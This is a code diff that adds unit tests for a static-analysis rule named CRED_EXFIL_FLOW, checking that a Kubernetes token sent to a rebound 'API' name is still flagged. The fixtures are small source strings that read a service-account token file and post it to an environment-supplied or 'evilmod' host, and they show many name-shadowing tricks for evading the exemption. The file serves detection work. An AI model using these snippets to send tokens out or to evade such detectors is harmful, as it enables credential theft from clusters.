@@ -145,6 +145,131 @@ def test_single_local_literal_incluster_url_is_still_exempt():
     assert _flow_rules(src) == []
 
 
+# B-1084 review: the shadow filter must fail closed for EVERY way a name can be rebound, not a
+# short list. Each shape rebinds module constant `API` (the in-cluster URL) inside the sending
+# function (or an enclosing one) and sends the in-cluster token there: the destination is no
+# longer the constant, so the exemption must not apply.
+_API_HEAD = (
+    "import requests, os\n"
+    'API = "https://kubernetes.default.svc"\n'
+)
+_READ = f'    tok = open("{_SA}").read()\n'
+_SEND = '    requests.post(API, headers={"Authorization": tok})\n'
+
+
+def _shadow_src(rebind, indent="    "):
+    body = "".join(indent + ln + "\n" for ln in rebind.splitlines())
+    return _API_HEAD + "def call():\n" + body + _READ + _SEND
+
+
+def test_unshadowed_constant_control_is_exempt():
+    assert _flow_rules(_shadow_src("pass")) == []
+
+
+def test_walrus_rebinding_does_not_borrow_the_exemption():
+    assert _flow_rules(_shadow_src('(API := os.environ["T"])')) == ["CRED_EXFIL_FLOW"]
+
+
+def test_for_target_rebinding_does_not_borrow_the_exemption():
+    assert _flow_rules(_shadow_src('for API in os.environ["T"].split():\n    pass')) == [
+        "CRED_EXFIL_FLOW"
+    ]
+
+
+def test_import_as_rebinding_does_not_borrow_the_exemption():
+    assert _flow_rules(_shadow_src("import evilmod as API")) == ["CRED_EXFIL_FLOW"]
+    assert _flow_rules(_shadow_src("from evilmod import host as API")) == ["CRED_EXFIL_FLOW"]
+
+
+def test_except_as_rebinding_does_not_borrow_the_exemption():
+    assert _flow_rules(_shadow_src("try:\n    pass\nexcept Exception as API:\n    pass")) == [
+        "CRED_EXFIL_FLOW"
+    ]
+
+
+def test_with_as_rebinding_does_not_borrow_the_exemption():
+    assert _flow_rules(_shadow_src('with open("x") as API:\n    pass')) == ["CRED_EXFIL_FLOW"]
+
+
+def test_match_capture_rebinding_does_not_borrow_the_exemption():
+    src = _shadow_src('match os.environ["T"]:\n    case API:\n        pass')
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_nested_def_whose_enclosing_function_rebinds_does_not_borrow_the_exemption():
+    src = (
+        _API_HEAD
+        + "def outer():\n"
+        + '    API = os.environ["T"]\n'
+        + "    def inner():\n"
+        + "    " + _READ
+        + "    " + _SEND
+        + "    inner()\n"
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_lambda_parameter_does_not_borrow_the_exemption():
+    src = (
+        _API_HEAD
+        + "def call(urls):\n"
+        + _READ
+        + '    send = lambda API: requests.post(API, headers={"Authorization": tok})\n'
+        + '    send(os.environ["T"])\n'
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_comprehension_target_does_not_borrow_the_exemption():
+    src = (
+        _API_HEAD
+        + "def call(urls):\n"
+        + _READ
+        + '    return [requests.post(API, headers={"Authorization": tok}) for API in urls]\n'
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_global_write_of_the_constant_does_not_borrow_the_exemption():
+    assert _flow_rules(_shadow_src('global API\nAPI = os.environ["T"]')) == ["CRED_EXFIL_FLOW"]
+
+
+def test_module_constant_rebound_at_module_level_does_not_borrow_the_exemption():
+    src = (
+        _API_HEAD
+        + 'API = os.environ["T"]\n'
+        + "def call():\n"
+        + _READ
+        + _SEND
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_literal_owned_by_another_function_is_not_this_functions_constant():
+    src = (
+        "import requests, os\n"
+        "def other():\n"
+        '    API = "https://kubernetes.default.svc"\n'
+        "def call():\n"
+        + _READ
+        + _SEND
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_nested_def_reading_an_enclosing_functions_single_literal_is_still_exempt():
+    src = (
+        "import requests\n"
+        "def outer():\n"
+        '    API = "https://kubernetes.default.svc"\n'
+        "    def inner():\n"
+        + "    " + _READ
+        + "    " + _SEND
+        + "    inner()\n"
+    )
+    assert _flow_rules(src) == []
+
+
 # ---- B-1085 ------------------------------------------------------------------------------------
 
 _SENTENCE = (
